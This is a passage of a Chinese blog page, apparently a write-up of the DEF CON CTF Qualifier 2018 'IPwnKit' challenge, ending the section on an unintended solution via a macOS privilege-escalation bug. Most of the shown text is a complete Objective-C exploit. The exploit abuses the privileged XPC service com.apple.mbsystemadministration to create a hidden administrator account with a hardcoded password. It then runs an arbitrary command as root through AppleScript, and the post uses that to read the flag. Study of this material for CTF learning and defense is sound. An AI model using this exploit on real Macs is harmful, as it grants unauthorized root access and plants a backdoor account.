class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#import &lt;Foundation&#x2F;Foundation.h&gt;</span><br><span class="line">#import &lt;Security&#x2F;Authorization.h&gt;</span><br><span class="line">#import &lt;ServiceManagement&#x2F;ServiceManagement.h&gt;</span><br><span class="line">#import &lt;xpc&#x2F;xpc.h&gt;</span><br><span class="line"></span><br><span class="line">@protocol MBSAProtocol &lt;NSObject&gt;</span><br><span class="line">- (void)createUserWithInfo:(NSDictionary *)arg1</span><br><span class="line">          completionBlock:(void (^)(unsigned int))arg2;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">#define kUserName &quot;wtf&quot;</span><br><span class="line">#define kPassword &quot;this_is_so_complicated&quot;</span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) void run() &#123;</span><br><span class="line"> NSLog(@&quot;ready&quot;);</span><br><span class="line"></span><br><span class="line"> @autoreleasepool &#123;</span><br><span class="line">   NSString *kXPCServiceName &#x3D; @&quot;com.apple.mbsystemadministration&quot;;</span><br><span class="line">   NSXPCConnection *conn &#x3D; [[NSXPCConnection alloc]</span><br><span class="line">       initWithMachServiceName:kXPCServiceName</span><br><span class="line">                       options:NSXPCConnectionPrivileged];</span><br><span class="line">   conn.remoteObjectInterface &#x3D;</span><br><span class="line">       [NSXPCInterface interfaceWithProtocol:@protocol(MBSAProtocol)];</span><br><span class="line">   conn.invalidationHandler &#x3D; ^&#123;</span><br><span class="line">     NSLog(@&quot;Fatal: unknown error&quot;);</span><br><span class="line">     exit(-1);</span><br><span class="line">   &#125;;</span><br><span class="line">   [conn resume];</span><br><span class="line"></span><br><span class="line">   id remote &#x3D; [conn remoteObjectProxyWithErrorHandler:^(NSError *proxyError) &#123;</span><br><span class="line">     NSLog(@&quot;Fatal: %@&quot;, proxyError);</span><br><span class="line">     exit(-1);</span><br><span class="line">   &#125;];</span><br><span class="line"></span><br><span class="line">   NSDictionary *info &#x3D; @&#123;</span><br><span class="line">     @&quot;kUserName&quot; : @kUserName,</span><br><span class="line">     @&quot;kUserFullName&quot; : @kUserName,</span><br><span class="line">     @&quot;kHint&quot; : @&quot;ourhardworkbythesewordsguardedpleasedontsteal&quot;,</span><br><span class="line">     @&quot;kPassword&quot; : @kPassword,</span><br><span class="line">     @&quot;kAdministrator&quot; : @1,</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   dispatch_semaphore_t wait_for &#x3D; dispatch_semaphore_create(0);</span><br><span class="line">   [remote createUserWithInfo:info</span><br><span class="line">              completionBlock:^(unsigned int state) &#123;</span><br><span class="line">                NSLog(@&quot;result: %d&quot;, state);</span><br><span class="line">                dispatch_semaphore_signal(wait_for);</span><br><span class="line">              &#125;];</span><br><span class="line">   dispatch_semaphore_wait(</span><br><span class="line">       wait_for, dispatch_time(DISPATCH_TIME_NOW, 2ull * NSEC_PER_SEC));</span><br><span class="line"></span><br><span class="line">   NSLog(@&quot;Successfully created user, now run command as root&quot;);</span><br><span class="line"></span><br><span class="line">   const char *env &#x3D; getenv(&quot;CMD&quot;);</span><br><span class="line">   NSString *cmd &#x3D; [[NSString stringWithFormat:@&quot;%s&quot;, env ? env : &quot;id&quot;]</span><br><span class="line">       stringByReplacingOccurrencesOfString:@&quot;\&quot;&quot;</span><br><span class="line">                                 withString:@&quot;\\\&quot;&quot;];</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; AuthorizationExecuteWithPrivileges is deprecated!</span><br><span class="line">   NSDictionary *error &#x3D; NULL;</span><br><span class="line">   NSString *script &#x3D; [NSString</span><br><span class="line">       stringWithFormat:@&quot;do shell script \&quot;%@\&quot; &quot;</span><br><span class="line">                         &quot;user name \&quot;&quot; kUserName &quot;\&quot; password \&quot;&quot; kPassword</span><br><span class="line">                         &quot;\&quot; with administrator privileges&quot;,</span><br><span class="line">                        cmd];</span><br><span class="line"></span><br><span class="line">   NSAppleScript *appleScript &#x3D; [[NSAppleScript alloc] initWithSource:script];</span><br><span class="line">   NSAppleEventDescriptor *result &#x3D; [appleScript executeAndReturnError:&amp;error];</span><br><span class="line">   if (result) &#123;</span><br><span class="line">     NSLog(@&quot;success!\n%@&quot;, [result stringValue]);</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">     NSLog(@&quot;failure: %@&quot;, error);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   &#x2F;&#x2F; todo: cleanup, remove the account</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> &#x2F;&#x2F; kill the host</span><br><span class="line"> exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用root权限去读<code>/var/root/flag</code><br><img src="https://raw.githubusercontent.com/sung3r/gitnote-images/main/gitnote-images/2021/01/31/1612101250064-1612101250070.png" alt="title"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2020/02/17/DefConCTF-Qualifier-2018-IPwnKit%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="leancloud-visitors view" data-flag-title="DefConCTF Qualifier 2018 IPwnKit解题思路">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2020/05/01/某次强制关机后引发的血案/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2020-02-17 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/macOS/">macOS<span>1</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/解题思路/">解题思路<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#预期解"><span class="toc-article-text">预期解</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#非预期解法-利用macOS本身的提权漏洞"><span class="toc-article-text">非预期解法(利用macOS本身的提权漏洞)</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2021 sung3r's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
